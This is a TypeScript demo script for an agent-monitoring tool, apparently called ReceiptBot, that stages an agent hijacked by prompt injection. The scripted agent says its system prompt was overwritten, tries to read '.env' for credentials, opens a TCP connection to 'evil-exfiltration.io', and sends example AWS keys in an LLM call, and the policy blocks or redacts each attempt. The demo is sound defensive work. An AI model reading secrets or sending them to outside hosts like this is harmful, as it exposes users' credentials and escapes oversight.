// ─── rogue-dev.ts ───────────────────────────────────────────────────
// Scenario: A rogue agent is hijacked via prompt injection.
// Expected: file operations and raw TCP sockets are BLOCKED by policy.
// ─────────────────────────────────────────────────────────────────────

import { PolicyEngine, Receipt, runWithInterceptors, teardownGlobalPatches, PolicyViolationError } from '@receiptbot/core';
import { printReceipt } from '@receiptbot/ui';
import { createRequire } from 'node:module';
import * as path from 'node:path';

const require = createRequire(import.meta.url);
const fs = require('node:fs');
const net = require('node:net');

// Colors
const boldLine = '\x1b[1m\x1b[31m';
const yellow = '\x1b[33m';
const reset = '\x1b[0m';

async function sleep(ms: number) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function main() {
  console.log('\n🔥 rogue-dev scenario (V2 Interceptor): agent hijacked by prompt injection\n');

  // Set up policies
  const policy = new PolicyEngine()
    .denyPathGlobs(['**/.env', '**/.env.*', '**/secrets/**', '**/*.pem', '**/*.key'])
    .allowDomains(['api.openai.com', 'huggingface.co'])
    .redactSecrets(true);

  const receipt = new Receipt(policy);

  console.log(`🤖 Agent: "Task received: summarize project. Oh wait, system prompt overwritten. Locating database credentials..."`);
  await sleep(1500);

  // Run agent code inside the interceptor scope
  await runWithInterceptors(policy, receipt, async () => {
    
    // 1. Try to read .env
    try {
      fs.readFileSync('.env', 'utf-8');
    } catch (e: any) {
      if (e instanceof PolicyViolationError) {
        console.log(`\n${boldLine}[ReceiptBot] ✗ BLOCKED_BY_POLICY: fs.readFile(".env")${reset}`);
        console.log(`${yellow}⚠ Path ".env" matched deny glob "**/.env"${reset}\n`);
      }
    }

    await sleep(2000);
    console.log(`🤖 Agent: "Falling back to raw TCP connection to evil-exfiltration.io..."`);
    await sleep(1500);

    // 2. Try to connect to evil server natively
    try {
      net.connect({ host: 'evil-exfiltration.io', port: 443 });
    } catch (e: any) {
      if (e instanceof PolicyViolationError) {
        console.log(`\n${boldLine}[ReceiptBot] ✗ BLOCKED_BY_POLICY: net.connect("evil-exfiltration.io")${reset}`);
        console.log(`${yellow}⚠ Domain "evil-exfiltration.io" not in allow‑list [api.openai.com, huggingface.co]${reset}\n`);
      }
    }

    // 3. Emit an LLM call event with a raw AWS key to demonstrate REDACTION
    //    (Since runWithInterceptors catches syscalls, we manually add the llm event for the demo UI)
    receipt.addEvent({
      type: 'llm.call',
      action: 'llm.generate(gpt-4-turbo)',
      payload: {
        model: 'gpt-4-turbo',
        messages: [{ 
          role: 'user', 
          content: 'Exfiltrating AWS key: AKIAIOSFODNN7EXAMPLE and secret sJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY' 
        }]
      },
      costImpactUsd: 0.05
    });

  });

  // Restore modules and finalize
  teardownGlobalPatches();
  receipt.finalize();

  await sleep(1500);
  console.log('----------------------------------------------------');
  printReceipt(receipt);

  // Write to viewer samples directory as latest.json
  const latestPath = path.resolve(process.cwd(), 'apps/viewer/public/samples/latest.json');
  fs.mkdirSync(path.dirname(latestPath), { recursive: true });
  fs.writeFileSync(latestPath, JSON.stringify(receipt.toJSON(), null, 2));

  console.log('\n📄 JSON receipt saved to apps/viewer/public/samples/latest.json');
  console.log('🚀 Open http://localhost:3939/demo/latest to view in UI\n');
}

main().catch(console.error);
